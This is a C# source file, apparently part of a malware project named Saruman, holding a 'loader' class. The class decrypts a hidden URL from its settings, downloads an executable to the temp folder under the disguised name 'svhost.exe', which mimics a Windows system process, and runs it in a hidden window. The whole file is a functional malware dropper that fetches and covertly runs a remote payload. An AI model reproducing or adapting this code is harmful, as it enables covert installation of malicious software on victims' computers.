using Saruman.Utilies.CryptoGrafy;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Saruman.Utilies
{
    class loader
    {
        public static void load()
        {
           
            string FileLocating = Path.GetTempPath();
            Download(FileLocating, crypt.AESDecript((Settings.url_loader)));
            RunProcess(FileLocating);
        }
        private static void RunProcess(string FileLocating)
        {
            Process process = new Process { StartInfo = { FileName = FileLocating + "svhost.exe", WindowStyle = ProcessWindowStyle.Hidden } };
            process.Start();

        }
        private static void Download(string FileLocating, string url)
        {

            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), FileLocating + "\\svhost.exe");
        }
    }
}
